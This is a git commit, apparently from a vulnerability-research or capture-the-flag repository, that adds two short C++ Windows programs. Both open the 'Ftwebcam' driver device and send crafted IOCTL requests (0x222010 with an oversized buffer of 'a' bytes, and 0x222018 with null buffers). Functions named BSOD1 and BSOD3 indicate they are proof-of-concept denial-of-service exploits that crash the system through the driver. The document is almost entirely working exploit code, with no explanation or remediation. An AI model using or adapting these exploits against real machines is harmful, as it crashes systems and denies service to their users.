3b1abeb2aa92f8ce91a97c5a083d2a7b77fb8a26
zeze <zezectf@gmail.com>
2023-02-26 23:49:38 +0800

    feat: unassigned6, 7, 8

---
+++ unassigned6/bin/DoS1.cpp
@@ -0,0 +1,31 @@
+﻿#include <iostream>
+#include <Windows.h>
+#include <winioctl.h>
+
+#define SymLinkName L"\\\\.\\Ftwebcam"
+
+HANDLE hDevice;
+
+void BSOD1_0x222010()
+{
+    DWORD dwWrite;
+    unsigned char data[0x1000];
+    memset(data, 'a', 0x1000);
+    DeviceIoControl(hDevice, 0x222010, &data, sizeof(data), &data, sizeof(data), &dwWrite, NULL);
+}
+
+int main(int argc, char* argv[])
+{
+    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
+        system("pause");
+        return 0;
+    }
+
+    BSOD1_0x222010();
+
+    system("pause");
+    return 0;
+}
---
+++ unassigned8/ftwebcam.cpp
@@ -0,0 +1,29 @@
+﻿#include <iostream>
+#include <Windows.h>
+#include <winioctl.h>
+
+#define SymLinkName L"\\\\.\\Ftwebcam"
+
+HANDLE hDevice;
+
+void BSOD3_0x222018()
+{
+    DWORD dwWrite;
+    DeviceIoControl(hDevice, 0x222018, NULL, 0, NULL, 0, &dwWrite, NULL);
+}
+
+int main(int argc, char* argv[])
+{
+    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
+    if (hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
+        system("pause");
+        return 0;
+    }
+
+    BSOD3_0x222018();
+
+    system("pause");
+    return 0;
+}
